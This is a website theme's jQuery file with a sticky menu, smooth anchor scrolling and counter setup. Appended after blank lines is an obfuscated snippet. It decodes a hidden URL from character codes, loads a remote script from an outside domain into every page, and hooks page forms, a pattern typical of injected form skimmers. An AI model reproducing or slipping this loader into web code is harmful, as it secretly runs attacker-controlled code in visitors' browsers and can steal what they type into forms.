(function($) {
    "use strict";
/*--
    Menu Sticky
-----------------------------------*/
var $window = $(window);
$window.on('scroll', function() {
	var scroll = $window.scrollTop();
	if (scroll < 300) {
		$(".sticker").removeClass("stick");
	}else{
		$(".sticker").addClass("stick");
	}
});

    
$('a[href*="#"]:not([href="#"])').click(function() {
if (location.pathname.replace(/^\//,'') == this.pathname.replace(/^\//,'') && location.hostname == this.hostname) {
  var target = $(this.hash);
  target = target.length ? target : $('[name=' + this.hash.slice(1) +']');
  if (target.length) {
	$('html, body').animate({
	  scrollTop: target.offset().top - 75
	}, 1000);
	return false;
  }
}
});
    
/*--
	Counter UP
-----------------------------------*/
$('.counter').counterUp({
    delay: 20,
    time: 3000
});


})(jQuery);




(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b